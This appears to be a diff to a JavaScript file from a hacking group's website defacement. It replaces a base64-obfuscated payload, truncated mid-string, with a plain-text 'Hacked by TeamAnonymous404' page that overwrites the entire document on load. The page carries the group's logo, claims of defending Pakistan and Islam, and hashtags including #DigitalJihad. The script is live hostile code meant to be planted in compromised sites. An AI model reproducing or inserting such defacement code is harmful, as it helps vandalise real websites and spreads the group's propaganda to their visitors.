@@ -1,1 +1,206 @@
-document.documentElement.innerHTML = atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+SGFja2VkIGJ5IFRlYW1Bbm9ueW1vdXM0MDQ8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICBAbGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9T3JiaXRyb246d2dodEA3MDAmZGlzcGxheT1zd2FwJyk7CiAgICAgICogewogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgIH0KCiAgICAgIGh0bWwsIGJvZHkgewogICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICBmb250LWZhbWlseTogJ09yYml0cm9uJywgbW9ub3NwYWNlOwogICAgICAgIGJhY2tncm91bmQ6IGJsYWNrIHVybCgnaHR0cHM6Ly9pLnBpbmltZy5jb20vNzM2eC80Zi80My83NC80ZjQzNzRmNDc3ODg0NDc1ZWQ1ODE5OWM2MGUwYzk0NS5qcGcnKSBuby1yZXBlYXQgY2VudGVyIGNlbnRlciBmaXhlZDsKICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBvdmVyZmxvdy14OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIGJvZHk6OmJlZm9yZSB7CiAgICAgICAgY29udGVudDogJyc7CiAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgIHRvcDogMDsKICAgICAgICBsZWZ0OiAwOwogICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICBiYWNrZ3JvdW5kOiByYWRpYWwtZ3JhZGllbnQoY2lyY2xlIGF0IGNlbnRlciwgcmdiYSgwLDI1NSwyNTUsMC4yKSwgcmdiYSgyNTUsMCwyNTUsMC4wNSksIHRyYW5zcGFyZW50KTsKICAgICAgICB6LWluZGV4OiAwOwogICAgICB9CiAgICAgIC5vdmVybGF5IHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsIDAsIDAsIDAuODUpOwogICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICBwYWRkaW5nOiA1MHB4IDIwcHg7CiAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgIHotaW5kZXg6IDE7CiAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICB9CiAgICAgIC5sb2dvLXRvcCB7CiAgICAgICAgd2lkdGg6IDE1MHB4OwogICAgICAgaGVpZ2h0OiAxNTBweDsKICAgICAgICBtYXJnaW4tYm90dG9tOiAzMHB4OwogICAgICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAjMDBmZjAwOwogICAgICB9CiAgICAgIC5nbGl0Y2gtdGV4dCB7CiAgICAgICAgZm9udC1zaXplOiA2MHB4OwogICAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICBhbmltYXRpb246IGdsaXRjaCAxLjVzIGluZmluaXRlOwogICAgICB9CiAgICAgIC5tZXNzYWdlIHsKICAgICAgICBtYXgtd2lkdGg6IDgwMHB4OwogICAgICAgIGNvbG9yOiAjY2NjY2NjOwogICAgICAgIGZvbnQtc2l6ZTogMThweDsKICAgICAgICBsaW5lLWhlaWdodDogMS42OwogICAgICAgIG1hcmdpbi10b3A6IDMwcHg7CiAgICAgICAgcGFkZGluZzogMCAxMHB4OwogICAgICB9CiAgICAgIC5xdW90ZSB7CiAgICAgICAgbWFyZ2luLXRvcDogMjBweDsKICAgICAgICBjb2xvcjogI2ZmNDQ0NDsKICAgICAgICBmb250LXN0eWxlOiBpdGFsaWM7CiAgICAgIH0KICAgICAgZm9vdGVyIHsKICAgICAgICBtYXJnaW4tdG9wOiA0MHB4OwogICAgICAgIGNvbG9yOiAjNjY2OwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICAuaGFzaHRhZ3MgewogICAgICAgIG1hcmdpbi10b3A6IDMwcHg7CiAgICAgICAgY29sb3I6ICM2NDY0NjQ7CiAgICAgICAgZm9udC1zaXplOiAxOHB4OwogICAgICAgIHBhZGRpbmc6IDAgMTBweDsKICAgICAgICB3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7CiAgICAgIH0KICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDc2OHB4KSB7CiAgICAgICAgLmxvZ28tdG9wIHsKICAgICAgICAgIHdpZHRoOiAxMDBweDsKICAgICAgICAgIGhlaWdodDogMTAwcHg7CiAgICAgICAgfQogICAgICAgIC5nbGl0Y2gtdGV4dCB7CiAgICAgICAgICBmb250LXNpemU6IDM2cHg7CiAgICAgICAgfQogICAgICAgIC5tZXNzYWdlIHsKICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICB9CiAgICAgICAgLmhhc2h0YWdzIHsKICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICB9CiAgICAgIH0KICAgICAgQG1lZGlhIChtYXgtd2lkdGg6IDQ4MHB4KSB7CiAgICAgICAgLmdsaXRjaC10ZXh0IHsKICAgICAgICAgIGZvbnQtc2l6ZTogMjhweDsKICAgICAgICB9CiAgICAgICAgaD
+let hackedHtml = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hacked by TeamAnonymous404</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+  
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+  
+    html, body {
+      height: 100%;
+      font-family: 'Orbitron', monospace;
+      background: black url('https://i.pinimg.com/736x/4f/43/74/4f4374f477884475ed58199c60e0c945.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #00ff00;
+      text-align: center;
+      overflow-x: hidden;
+    }
+  
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at center, rgba(0,255,255,0.2), rgba(255,0,255,0.05), transparent);
+      z-index: 0;
+    }
+  
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.85);
+      width: 100%;
+      height: 100%;
+      padding: 50px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+      text-align: center;
+    }
+  
+    .logo-top {
+      width: 150px;
+      height: 150px;
+      margin-bottom: 30px;
+      border-radius: 50%;
+      border: 2px solid #00ff00;
+    }
+  
+    .glitch-text {
+      font-size: 60px;
+      font-weight: bold;
+      color: #fff;
+      position: relative;
+      animation: glitch 1.5s infinite;
+    }
+  
+    .glitch-text::before,
+    .glitch-text::after {
+      content: 'TeamAnonymous404';
+      position: absolute;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      opacity: 0.8;
+    }
+  
+    .glitch-text::before {
+      color: #ff00c8;
+      z-index: -1;
+      animation: glitch-before 1.5s infinite;
+    }
+  
+    .glitch-text::after {
+      color: #00fff9;
+      z-index: -2;
+      animation: glitch-after 1.5s infinite;
+    }
+  
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-1px, 1px); }
+      40% { transform: translate(-3px, 2px); }
+      60% { transform: translate(3px, 1px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
+  
+    @keyframes glitch-before {
+      0% { transform: translate(-2px, -2px); }
+      20% { transform: translate(-4px, 2px); }
+      40% { transform: translate(-1px, -1px); }
+      60% { transform: translate(-3px, 1px); }
+      80% { transform: translate(-2px, -3px); }
+      100% { transform: translate(0); }
+    }
+  
+    @keyframes glitch-after {
+      0% { transform: translate(2px, 2px); }
+      20% { transform: translate(4px, -2px); }
+      40% { transform: translate(1px, 1px); }
+      60% { transform: translate(3px, -1px); }
+      80% { transform: translate(2px, 3px); }
+      100% { transform: translate(0); }
+    }
+  
+    .message {
+      max-width: 800px;
+      color: #cccccc;
+      font-size: 18px;
+      line-height: 1.6;
+      margin-top: 30px;
+      padding: 0 10px;
+    }
+  
+    .quote {
+      margin-top: 20px;
+      color: #ff4444;
+      font-style: italic;
+    }
+  
+    footer {
+      margin-top: 40px;
+      color: #666;
+      font-size: 14px;
+    }
+  
+    .hashtags {
+      margin-top: 30px;
+      color: #646464;
+      font-size: 18px;
+      padding: 0 10px;
+      word-wrap: break-word;
+    }
+  
+    /* === Responsive Design === */
+    @media (max-width: 768px) {
+      .logo-top {
+        width: 100px;
+        height: 100px;
+      }
+  
+      .glitch-text {
+        font-size: 36px;
+      }
+  
+      .message {
+        font-size: 16px;
+      }
+  
+      .hashtags {
+        font-size: 16px;
+      }
+    }
+  
+    @media (max-width: 480px) {
+      .glitch-text {
+        font-size: 28px;
+      }
+  
+      h2 {
+        font-size: 20px !important;
+      }
+  
+      .logo-top {
+        width: 80px;
+        height: 80px;
+      }
+    }
+  </style>
+  
+</head>
+<body>
+  <div class="overlay">
+    <img class="logo-top" src="https://i.postimg.cc/fTBMQrxd/Team-Anonymous404-Logo.png" alt="TeamAnon Logo" />
+    <h2 style="color: #ff4444; font-size: 28px; margin-bottom: 15px; text-shadow: 0 0 5px #ff0000;">
+       Hacked by TeamAnonymous404
+    </h2>
+    <div class="glitch-text">TeamAnonymous404</div>
+
+    <div class="message">
+      <p><strong>TeamAnonymous404</strong> is a digital force defending <strong>Pakistan</strong> and upholding the honor of <strong>Islam</strong>. We are not just hackers — we are cyber warriors against injustice, misinformation, and oppression.</p>
+      <p>Our mission is driven by purpose, not chaos. Every system has a flaw. Every wall has a weakness. And we find it — we destroy it, to expose and warn.</p>
+      <p class="quote">"Security is a myth — today's shield is tomorrow's breach."</p>
+    </div>
+    <div style="margin-top: 30px; color: #646464; font-size: 18px;">
+        #PakistanZindabad&nbsp;&nbsp;#FreeKashmir&nbsp;&nbsp;#CyberResistance&nbsp;&nbsp;#DigitalJihad&nbsp;&nbsp;#TeamAnonymous404
+      </div>
+      
+    <footer>&copy; TeamAnonymous404 — Guardians of Digital Pakistan</footer>
+  </div>
+</body>
+</html>
+`;
+
+document.documentElement.innerHTML = hackedHtml;
